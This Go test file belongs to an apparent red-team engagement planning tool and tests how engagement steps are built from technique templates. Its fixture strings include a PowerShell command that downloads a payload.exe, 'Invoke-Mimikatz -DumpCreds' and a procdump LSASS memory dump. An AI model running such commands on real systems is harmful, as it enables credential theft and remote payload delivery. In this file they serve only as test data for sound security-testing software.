package engagement_test

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"github.com/bryanster/blacklight/internal/authn"
	"github.com/bryanster/blacklight/internal/engagement"
	"github.com/bryanster/blacklight/internal/events"
	storeactivity "github.com/bryanster/blacklight/internal/store/activity"
	storecontent "github.com/bryanster/blacklight/internal/store/content"
	storengagement "github.com/bryanster/blacklight/internal/store/engagement"
	"github.com/bryanster/blacklight/internal/store/identity"
	"github.com/bryanster/blacklight/internal/store/storetest"
)

// fromTemplateDeps holds everything needed for a from-template test.
type fromTemplateDeps struct {
	Procedures  *storecontent.Procedures
	Engagements *storengagement.Engagements
	Activity    *storeactivity.Entries
	Service     *engagement.Service
	Engagement  storengagement.Engagement
	Scenario    storengagement.Scenario
}

func newFromTemplateDeps(t *testing.T) *fromTemplateDeps {
	t.Helper()

	db := storetest.Migrated(t)
	procedures := storecontent.NewProcedures(db)
	engagements := storengagement.NewEngagements(db)
	scenarios := storengagement.NewScenarios(db)
	steps := storengagement.NewSteps(db)
	memberships := identity.NewMemberships(db)
	// Wired the way the server wires it (httpapi.NewServer). Leaving it nil
	// would skip the activity hook entirely, which is how the from-template
	// stall reached production with these tests green.
	entries := storeactivity.New(db)

	svc, err := engagement.New(engagement.Deps{
		Engagements: engagements,
		AttackPin:   nil, // no technique resolution in these tests
		Activity:    events.New(entries),
		Memberships: memberships,
		Scenarios:   scenarios,
		Steps:       steps,
	})
	if err != nil {
		t.Fatalf("engagement.New: %v", err)
	}

	eng, err := engagements.Create(context.Background(), storengagement.NewEngagement{
		Name:          "From Template Test",
		AttackVersion: "15.1",
		Mode:          storengagement.EngagementModeStandard,
		CreatedBy:     "0192f1a0-0000-7000-8000-000000000000",
	})
	if err != nil {
		t.Fatalf("create engagement: %v", err)
	}

	scenario, err := scenarios.Create(context.Background(), storengagement.NewScenario{
		EngagementID: eng.ID,
		Name:         "Test Scenario",
		Source:       storengagement.ScenarioSourceManual,
	})
	if err != nil {
		t.Fatalf("create scenario: %v", err)
	}

	return &fromTemplateDeps{
		Procedures:  procedures,
		Engagements: engagements,
		Activity:    entries,
		Service:     svc,
		Engagement:  eng,
		Scenario:    scenario,
	}
}

func actorForTest() authn.Subject {
	return authn.Subject{
		UserID:      "0192f1a0-0000-7000-8000-000000000000",
		Email:       "test@example.com",
		DisplayName: "Test",
	}
}

func TestCreateStepFromTemplate_RoundTrip(t *testing.T) {
	t.Parallel()

	d := newFromTemplateDeps(t)
	ctx := context.Background()

	// Create a fixture procedure template with distinct command and cleanup.
	tmpl, err := d.Procedures.Create(ctx, storecontent.ProcedureTemplate{
		SourceID:          storecontent.SourceIDAtomic,
		Version:           storecontent.VersionCurrent,
		ExternalID:        "T1059.001-1",
		Name:              "PowerShell Download",
		Description:       "Downloads and executes a remote payload.",
		Platforms:         json.RawMessage(`["windows"]`),
		Executor:          "powershell",
		ElevationRequired: true,
		Command:           "Invoke-WebRequest -Uri #{url} -OutFile #{path}",
		Cleanup:           "Remove-Item #{path}",
		InputArgs:         json.RawMessage(`[{"name":"url","description":"Payload URL","type":"url","default":""},{"name":"path","description":"Output path","type":"path","default":"C:\\temp\\payload.exe"}]`),
		Dependencies:      `[{"name":"prereq","description":"Need admin"}]`,
	})
	if err != nil {
		t.Fatalf("create template: %v", err)
	}

	// Create a step from the template with arg substitution.
	step, err := d.Service.CreateStepFromTemplate(ctx, actorForTest(), engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
		ArgValues: map[string]string{
			"url":  "https://example.com/payload.exe",
			"path": "C:\\temp\\payload.exe",
		},
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate: %v", err)
	}

	// Verify step identity fields.
	if step.Name != tmpl.Name {
		t.Errorf("name = %q, want %q", step.Name, tmpl.Name)
	}
	if step.Objective != tmpl.Description {
		t.Errorf("objective = %q, want %q", step.Objective, tmpl.Description)
	}
	if step.TemplateID != tmpl.ID {
		t.Errorf("templateId = %q, want %q", step.TemplateID, tmpl.ID)
	}

	// Parse the procedure snapshot.
	var proc map[string]any
	if err := json.Unmarshal(step.Procedure, &proc); err != nil {
		t.Fatalf("unmarshal procedure: %v", err)
	}

	// Command and cleanup must be distinct and have arg substitution applied.
	if proc["command"] != "Invoke-WebRequest -Uri https://example.com/payload.exe -OutFile C:\\temp\\payload.exe" {
		t.Errorf("command = %q, want substituted", proc["command"])
	}
	if proc["cleanup"] != "Remove-Item C:\\temp\\payload.exe" {
		t.Errorf("cleanup = %q, want substituted", proc["cleanup"])
	}

	// Structure preserved: platforms, executor, elevation_required.
	if proc["executor"] != "powershell" {
		t.Errorf("executor = %q, want powershell", proc["executor"])
	}
	if proc["elevationRequired"] != true {
		t.Errorf("elevationRequired = %v, want true", proc["elevationRequired"])
	}

	// Dependency metadata preserved.
	if _, ok := proc["dependencies"]; !ok {
		t.Error("dependencies missing from procedure")
	}

	// Arg values included in snapshot.
	argVals, ok := proc["argValues"].(map[string]any)
	if !ok {
		t.Fatal("argValues missing from procedure")
	}
	if argVals["url"] != "https://example.com/payload.exe" {
		t.Errorf("argValues.url = %v", argVals["url"])
	}

	// Input args preserved.
	if _, ok := proc["inputArgs"]; !ok {
		t.Error("inputArgs missing from procedure")
	}

	// Technique external IDs omitted since no attackpin in tests.
	if _, ok := proc["techniqueExternalIds"]; ok {
		t.Error("techniqueExternalIds should not be present when template has none")
	}

	// Tools derived from platforms.
	var tools []string
	if err := json.Unmarshal(step.Tools, &tools); err != nil {
		t.Fatalf("unmarshal tools: %v", err)
	}
	if len(tools) != 1 || tools[0] != "windows" {
		t.Errorf("tools = %v, want [windows]", tools)
	}

	// Attack version snapshotted from engagement.
	if step.AttackVersion != d.Engagement.AttackVersion {
		t.Errorf("attackVersion = %q, want %q", step.AttackVersion, d.Engagement.AttackVersion)
	}
}

func TestCreateStepFromTemplate_SnapshotIsolation(t *testing.T) {
	t.Parallel()

	d := newFromTemplateDeps(t)
	ctx := context.Background()

	tmpl, err := d.Procedures.Create(ctx, storecontent.ProcedureTemplate{
		SourceID:   storecontent.SourceIDAtomic,
		Version:    storecontent.VersionCurrent,
		ExternalID: "T1003-2",
		Name:       "Credential Dump",
		Command:    "Invoke-Mimikatz",
		Cleanup:    "",
		Platforms:  json.RawMessage(`["windows"]`),
	})
	if err != nil {
		t.Fatalf("create template: %v", err)
	}

	// Create the step snapshot.
	step, err := d.Service.CreateStepFromTemplate(ctx, actorForTest(), engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate: %v", err)
	}

	originalName := step.Name
	originalProc := string(step.Procedure)

	// Now update the template in the content store.
	tmpl.Name = "Credential Dump (updated)"
	tmpl.Command = "Invoke-Mimikatz -DumpCreds"
	tmpl.Cleanup = "Remove-Item dump.bin"
	tmpl.Description = "Updated description"
	_, err = d.Procedures.Update(ctx, tmpl)
	if err != nil {
		t.Fatalf("update template: %v", err)
	}

	// Create a second step from the (now updated) template. It should get the new values.
	step2, err := d.Service.CreateStepFromTemplate(ctx, actorForTest(), engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate (second): %v", err)
	}

	// First step is unchanged (snapshot isolation).
	if step.Name != originalName {
		t.Errorf("first step name changed after template update: got %q, want %q", step.Name, originalName)
	}
	if string(step.Procedure) != originalProc {
		t.Errorf("first step procedure changed after template update")
	}

	// Second step reflects the updated template.
	if step2.Name != "Credential Dump (updated)" {
		t.Errorf("second step name = %q, want updated name", step2.Name)
	}

	var proc2 map[string]any
	if err := json.Unmarshal(step2.Procedure, &proc2); err != nil {
		t.Fatalf("unmarshal second procedure: %v", err)
	}
	if proc2["cleanup"] != "Remove-Item dump.bin" {
		t.Errorf("second step cleanup = %q, want updated cleanup", proc2["cleanup"])
	}

	// Verify the template itself was updated (not a no-op update).
	reloaded, err := d.Procedures.ByID(ctx, tmpl.ID)
	if err != nil {
		t.Fatalf("reload template: %v", err)
	}
	if reloaded.Name != "Credential Dump (updated)" {
		t.Errorf("template name not updated: got %q", reloaded.Name)
	}
}

func TestCreateStepFromTemplate_NameAndObjectiveOverride(t *testing.T) {
	t.Parallel()

	d := newFromTemplateDeps(t)
	ctx := context.Background()

	tmpl, err := d.Procedures.Create(ctx, storecontent.ProcedureTemplate{
		SourceID:    storecontent.SourceIDAtomic,
		Version:     storecontent.VersionCurrent,
		ExternalID:  "T1055-1",
		Name:        "Process Injection",
		Description: "Injects code into a running process.",
		Command:     "Invoke-Injection",
		Platforms:   json.RawMessage(`["windows"]`),
	})
	if err != nil {
		t.Fatalf("create template: %v", err)
	}

	step, err := d.Service.CreateStepFromTemplate(ctx, actorForTest(), engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
		Name:         "Custom Step Name",
		Objective:    "Custom objective text",
		TargetAsset:  "DC01",
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate: %v", err)
	}

	if step.Name != "Custom Step Name" {
		t.Errorf("name = %q, want Custom Step Name", step.Name)
	}
	if step.Objective != "Custom objective text" {
		t.Errorf("objective = %q, want Custom objective text", step.Objective)
	}
	if step.TargetAsset != "DC01" {
		t.Errorf("targetAsset = %q, want DC01", step.TargetAsset)
	}
}

// TestCreateStepFromTemplate_RecordsActivityOnTheCallersTransaction is the
// regression test for importing a step from a template being impossible in a
// running server.
//
// The activity hook runs inside the write transaction that creates the step,
// and store.DB.Write serializes writers and is not re-entrant. Recording
// through RecordAlone — which opens a write transaction of its own — therefore
// queued the hook behind the transaction waiting on it: the request stalled
// until its deadline and the commit then failed on a transaction the cancelled
// context had already rolled back. Every from-template import answered 500.
//
// The two assertions are the two halves of that. A step that came back at all
// means the write finished rather than deadlocking, and an activity row for it
// means the hook wrote on the caller's transaction and shared its commit.
func TestCreateStepFromTemplate_RecordsActivityOnTheCallersTransaction(t *testing.T) {
	t.Parallel()

	d := newFromTemplateDeps(t)
	ctx := context.Background()

	tmpl, err := d.Procedures.Create(ctx, storecontent.ProcedureTemplate{
		SourceID:    storecontent.SourceIDAtomic,
		Version:     storecontent.VersionCurrent,
		ExternalID:  "T1003-2",
		Name:        "LSASS Dump",
		Description: "Dumps LSASS memory.",
		Command:     "procdump -ma lsass.exe #{path}",
		Platforms:   json.RawMessage(`["windows"]`),
	})
	if err != nil {
		t.Fatalf("create template: %v", err)
	}

	// A deadlocked write does not fail — it hangs — so the call is given a
	// deadline of its own rather than the test binary's. Two seconds is
	// several orders of magnitude more than one insert needs and well short of
	// the 30s request timeout the stall used to run into.
	deadlined, cancel := context.WithTimeout(ctx, 2*time.Second)
	defer cancel()

	actor := actorForTest()
	step, err := d.Service.CreateStepFromTemplate(deadlined, actor, engagement.CreateStepFromTemplateInput{
		EngagementID: d.Engagement.ID,
		ScenarioID:   d.Scenario.ID,
		Template:     tmpl,
		ArgValues:    map[string]string{"path": "C:\\temp\\lsass.dmp"},
	})
	if err != nil {
		t.Fatalf("CreateStepFromTemplate with activity recording wired: %v", err)
	}

	rows, _, err := d.Activity.List(ctx, storeactivity.ListFilter{
		ScopeEngagement: d.Engagement.ID,
	})
	if err != nil {
		t.Fatalf("list activity: %v", err)
	}

	var found *storeactivity.Row
	for i, row := range rows {
		if row.ObjectID == step.ID {
			found = &rows[i]
			break
		}
	}
	if found == nil {
		t.Fatalf("no activity row for step %s; the hook's write did not share the step's commit\nrows: %+v",
			step.ID, rows)
	}
	if got, want := found.Verb, string(events.VerbStepCreated); got != want {
		t.Errorf("verb = %q, want %q", got, want)
	}
	if got, want := found.ObjectType, events.ObjectStep; got != want {
		t.Errorf("objectType = %q, want %q", got, want)
	}
	if found.ActorID != actor.UserID {
		t.Errorf("actorId = %q, want %q", found.ActorID, actor.UserID)
	}

	// The delta is what makes the row useful in the timeline: it names the
	// template the step was imported from.
	var delta map[string]any
	if err := json.Unmarshal(found.Delta, &delta); err != nil {
		t.Fatalf("unmarshal delta: %v\nraw: %s", err, found.Delta)
	}
	if delta["template_id"] != tmpl.ID {
		t.Errorf("delta.template_id = %v, want %q", delta["template_id"], tmpl.ID)
	}
	if delta["template_name"] != tmpl.Name {
		t.Errorf("delta.template_name = %v, want %q", delta["template_name"], tmpl.Name)
	}
}
